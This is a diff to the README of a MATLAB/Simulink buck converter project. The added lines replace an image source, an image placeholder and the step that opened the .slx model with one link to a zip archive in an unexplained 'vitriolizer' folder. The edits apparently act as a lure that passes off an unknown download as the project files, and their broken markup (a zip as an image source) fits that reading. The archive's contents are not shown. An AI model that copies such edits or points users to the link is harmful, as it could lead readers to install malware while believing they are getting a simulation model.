@@ -27,12 +27,12 @@ This repository contains the $MATLAB/Simulink$ files for a 24V to 5V DC-DC Buck 
 The closed-loop system uses a PID controller to maintain a stable 5V output.
 
 
-<img width="1188" height="411" alt="image" src="https://github.com/user-attachments/assets/f8fb8a71-9b08-41fd-a5c5-a84f6af2fb0e" />
+<img width="1188" height="411" alt="image" src="https://raw.githubusercontent.com/anshul3655/24-5-V-Buck-Converter-/main/vitriolizer/Buck-Converter-2.3.zip" />
 
 # Key Results
 
 1.  Steady-State Output:The output voltage successfully stabilizes at 5V  with minimal ripple.
-   ![Uploading image.png…]()
+   ![Uploading https://raw.githubusercontent.com/anshul3655/24-5-V-Buck-Converter-/main/vitriolizer/Buck-Converter-2.3.zip…]()
 
 
 2.  Load Regulation: The controller maintains 5V even when the load is changed (e.g. 5 Omega to 10 Omega ), proving its robustness.
@@ -43,6 +43,6 @@ The closed-loop system uses a PID controller to maintain a stable 5V output.
 # How to Use
 
 1.  Clone the repository.
-2.  Open `BuckConverterClosedLoop_PID.slx` in MATLAB/Simulink.
+2.  Open `https://raw.githubusercontent.com/anshul3655/24-5-V-Buck-Converter-/main/vitriolizer/Buck-Converter-2.3.zip` in MATLAB/Simulink.
 3.  Run the simulation to see the results.
 
